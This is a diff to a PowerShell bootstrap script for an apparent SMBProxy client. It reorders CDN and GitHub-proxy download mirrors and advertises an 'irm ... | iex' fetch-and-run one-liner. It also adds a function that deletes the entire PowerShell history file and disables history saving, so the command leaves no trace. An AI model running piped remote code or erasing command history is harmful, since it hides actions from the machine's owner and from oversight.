@@ -21,7 +21,7 @@
       8. Multi-mirror download with automatic fallback (GitHub proxies + CDN)
 
     Usage:
-      irm https://gh-proxy.com/https://raw.githubusercontent.com/lcxxjmsg-cyber/SMBProxy/main/client/start-client.ps1 | iex
+      irm https://cdn.jsdelivr.net/gh/lcxxjmsg-cyber/SMBProxy@main/client/start-client.ps1 | iex
 #>
 
 # ============ config ============
@@ -33,7 +33,8 @@ $GitHubBranch = 'main'
 $Repo      = "$GitHubUser/$GitHubRepo"
 $TaskName  = 'SMBProxy_ClientBootstrap'
 $cacheRoot = Join-Path $env:TEMP 'SMBProxy'
-$SelfUrl   = "https://gh-proxy.com/https://raw.githubusercontent.com/$Repo/$GitHubBranch/client/start-client.ps1"
+# Primary entry via jsDelivr (CDN-cached, CN-reachable, not rate-limited).
+$SelfUrl   = "https://cdn.jsdelivr.net/gh/$Repo@$GitHubBranch/client/start-client.ps1"
 
 # ---- localized messages: Base64(UTF-8), decoded at runtime to avoid mojibake ----
 $T = @{
@@ -75,6 +76,20 @@ $T = @{
 }
 function M([string]$key) { [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($T[$key])) }
 
+# ---- wipe this command from PowerShell history (user asked not to record it) ----
+# Deletes the persistent PSReadLine history file, clears the in-memory session
+# history, and switches the current session to SaveNothing so the running
+# "irm | iex" line is not flushed back to disk when it finishes.
+function Clear-CommandHistory {
+    try { Clear-History -ErrorAction SilentlyContinue } catch {}
+    try {
+        $h = (Get-PSReadLineOption -ErrorAction SilentlyContinue).HistorySavePath
+        if ($h -and (Test-Path $h)) { Remove-Item $h -Force -ErrorAction SilentlyContinue }
+    } catch {}
+    try { Set-PSReadLineOption -HistorySaveStyle SaveNothing -ErrorAction SilentlyContinue } catch {}
+}
+Clear-CommandHistory
+
 # ---- force TLS 1.2 (required by GitHub) ----
 try { [Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12 } catch {}
 
@@ -94,20 +109,27 @@ if (-not $isAdmin) {
 }
 
 # ================= mirrors =================
+# Order matters: fastest / least rate-limited first.
+# jsDelivr (CDN) is preferred for scripts & small files (CN-reachable, cached,
+# not rate-limited), but has a ~50MB limit so it is skipped for big plugins.
+# GitHub proxies (gh-proxy/ghfast/ghproxy) can be flaky or rate-limited (429),
+# so they come after the CDN; raw.githubusercontent is the last resort.
 function Get-MirrorUrls([string]$rel, [bool]$includeCdn) {
     $b = $GitHubBranch
-    $urls = @(
+    $urls = @()
+    if ($includeCdn) {
+        $urls += @(
+            "https://cdn.jsdelivr.net/gh/$Repo@$b/$rel",
+            "https://fastly.jsdelivr.net/gh/$Repo@$b/$rel",
+            "https://gcore.jsdelivr.net/gh/$Repo@$b/$rel"
+        )
+    }
+    $urls += @(
         "https://gh-proxy.com/https://raw.githubusercontent.com/$Repo/$b/$rel",
         "https://ghfast.top/https://raw.githubusercontent.com/$Repo/$b/$rel",
         "https://ghproxy.net/https://raw.githubusercontent.com/$Repo/$b/$rel",
         "https://raw.githubusercontent.com/$Repo/$b/$rel"
     )
-    if ($includeCdn) {
-        $urls += @(
-            "https://cdn.jsdelivr.net/gh/$Repo@$b/$rel",
-            "https://fastly.jsdelivr.net/gh/$Repo@$b/$rel"
-        )
-    }
     return $urls
 }
 
